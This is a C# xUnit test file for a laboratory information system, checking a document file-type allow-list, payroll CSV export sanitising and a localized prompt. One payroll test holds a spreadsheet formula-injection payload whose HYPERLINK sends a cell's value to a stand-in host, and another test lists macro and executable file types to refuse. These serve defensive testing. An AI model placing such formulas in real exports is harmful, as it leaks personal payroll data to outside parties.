using System.Reflection;
using FluentAssertions;
using MarocLIS.Application.Abstractions;
using MarocLIS.Application.HumanResources;
using MarocLIS.Application.Quality;
using MarocLIS.Domain.Common;
using MarocLIS.Domain.Inventory;
using MarocLIS.Domain.Quality;
using MarocLIS.Localization;
using Xunit;

namespace MarocLIS.Tests.Domain;

/// <summary>
/// Fourth review (cycle 2), UI and security: S1 (controlled documents of any file type opened
/// through the shell), S2 (payroll CSV cells written as formulas) and U3 (the sequence format
/// prompt without the series name).
/// </summary>
public sealed class ReviewFixesCycle2UiTests
{
    // ---- S1: allow-list shared by purchasing and controlled documents ----------------------------

    [Theory]
    [InlineData("procedure.pdf", "application/pdf")]
    [InlineData("SCAN.TIFF", "image/tiff")]
    [InlineData("photo.jpeg", "image/jpeg")]
    [InlineData("form.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document")]
    [InlineData("sheet.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")]
    public void SafeDocumentFile_accepts_documents_that_run_nothing(string name, string type) =>
        SafeDocumentFile.ContentTypeFor(name).Should().Be(type);

    [Theory]
    [InlineData("IFU_glucose.docm")]
    [InlineData("notice.pdf.js")]
    [InlineData("old.doc")]
    [InlineData("old.xls")]
    [InlineData("macro.xlsm")]
    [InlineData("setup.exe")]
    [InlineData("page.hta")]
    [InlineData("shortcut.lnk")]
    [InlineData("noextension")]
    public void SafeDocumentFile_refuses_anything_else(string name)
    {
        SafeDocumentFile.ContentTypeFor(name).Should().BeNull();
        PurchasingDocument.ContentTypeFor(name).Should().BeNull();
    }

    [Theory]
    [InlineData("IFU_glucose.docm")]
    [InlineData("notice.pdf.js")]
    [InlineData("procedure.doc")]
    public async Task AddDraft_with_a_file_type_outside_the_list_is_refused_before_anything_is_saved(string name)
    {
        var document = NewDocument();
        var saves = 0;
        var service = Service(document, onSave: () => saves++);

        var result = await service.AddDraftAsync(document.Id, null, [1, 2, 3], name);

        result.FirstError.ResourceKey.Should().Be("Document_FileType");
        document.Versions.Should().BeEmpty();
        saves.Should().Be(0);
    }

    [Fact]
    public async Task AddDraft_takes_the_content_type_from_the_extension()
    {
        var document = NewDocument();
        var service = Service(document);

        var result = await service.AddDraftAsync(document.Id, null, [1, 2, 3], "PR-PRE-001.PDF");

        result.IsSuccess.Should().BeTrue();
        var version = document.Versions.Single();
        version.FileName.Should().Be("PR-PRE-001.PDF");
        version.ContentType.Should().Be("application/pdf");
    }

    [Fact]
    public async Task GetContent_refuses_a_version_stored_before_the_allow_list()
    {
        var service = Service(NewDocument(),
                              content: new DocumentContent([1], "instructions.hta", "application/octet-stream"));

        var result = await service.GetContentAsync(Guid.NewGuid(), 1);

        result.FirstError.ResourceKey.Should().Be("Document_FileType");
    }

    [Fact]
    public async Task GetContent_returns_an_allowed_version()
    {
        var service = Service(NewDocument(), content: new DocumentContent([1], "procedure.pdf", "application/pdf"));

        (await service.GetContentAsync(Guid.NewGuid(), 1)).IsSuccess.Should().BeTrue();
    }

    private static ControlledDocument NewDocument() =>
        new("PR-PRE-001", new MultilingualText("Prélèvement veineux"), DocumentKind.Procedure, Guid.NewGuid());

    private static DocumentControlService Service(ControlledDocument document, Action? onSave = null,
                                                  DocumentContent? content = null) =>
        new(Stub.Of<IRepository<ControlledDocument>>(new()
            {
                ["GetByIdWithDetailsAsync"] = _ => Task.FromResult<ControlledDocument?>(document)
            }),
            Stub.Of<IDocumentControlQueries>(new()
            {
                ["GetContentAsync"] = _ => Task.FromResult(content)
            }),
            Stub.Of<IUnitOfWork>(new()
            {
                ["SaveChangesAsync"] = _ => { onSave?.Invoke(); return Task.FromResult(1); }
            }),
            Stub.Of<IPermissionGuard>(),
            Stub.Of<ICurrentUser>(),
            Stub.Of<IClock>());

    // ---- S2: payroll CSV cells ------------------------------------------------------------------

    [Fact]
    public void Payroll_csv_neutralises_a_formula_in_a_name_and_keeps_amounts_as_numbers()
    {
        var csv = typeof(PayrollService).GetMethod("Csv", BindingFlags.NonPublic | BindingFlags.Static)!;
        object?[] row = ["=HYPERLINK(\"http://x.example/?\"&C2;\"BENNANI\")", "+SUM(A1)", "@SUM(A1)",
                         -125.5m, "-3", new DateOnly(2026, 10, 31)];

        var text = (string)csv.Invoke(null, [new[] { row }])!;

        text.TrimEnd().Should().Be(
            "\"'=HYPERLINK(\"\"http://x.example/?\"\"&C2;\"\"BENNANI\"\")\";'+SUM(A1);'@SUM(A1);-125,50;-3;31/10/2026");
    }

    // ---- U3: the sequence format prompt ---------------------------------------------------------

    [Theory]
    [InlineData(AppLanguage.French)]
    [InlineData(AppLanguage.Arabic)]
    [InlineData(AppLanguage.English)]
    public void Sequence_format_prompt_names_the_series_and_lists_the_tokens(AppLanguage language)
    {
        var localizer = new JsonLocalizer(new LocalizationOptions { MarkMissingKeys = true });

        var prompt = localizer.Format(language, "Admin.SequenceFormatPrompt", "Factures");

        prompt.Should().Contain("Factures").And.NotContain("{0}");
        foreach (var token in new[] { "{SITE}", "{YEAR}", "{YY}", "{MM}", "{SEQ:n}" })
            prompt.Should().Contain(token);
    }

    private class Stub : DispatchProxy
    {
        private Dictionary<string, Func<object?[]?, object?>> _handlers = [];

        public static T Of<T>(Dictionary<string, Func<object?[]?, object?>>? handlers = null) where T : class
        {
            var proxy = Create<T, Stub>();
            ((Stub)(object)proxy)._handlers = handlers ?? [];
            return proxy;
        }

        protected override object? Invoke(MethodInfo? targetMethod, object?[]? args)
        {
            if (targetMethod is null) return null;
            if (_handlers.TryGetValue(targetMethod.Name, out var handler)) return handler(args);
            return Neutral(targetMethod.ReturnType);
        }

        private static object? Neutral(Type type)
        {
            if (type == typeof(void)) return null;
            if (type == typeof(Result)) return Result.Success();
            if (type == typeof(Task)) return Task.CompletedTask;
            if (type.IsGenericType && type.GetGenericTypeDefinition() == typeof(Task<>))
            {
                var inner = type.GetGenericArguments()[0];
                var value = Neutral(inner);
                return typeof(Task).GetMethod(nameof(Task.FromResult))!
                                   .MakeGenericMethod(inner).Invoke(null, [value]);
            }
            return type.IsValueType ? Activator.CreateInstance(type) : null;
        }
    }
}
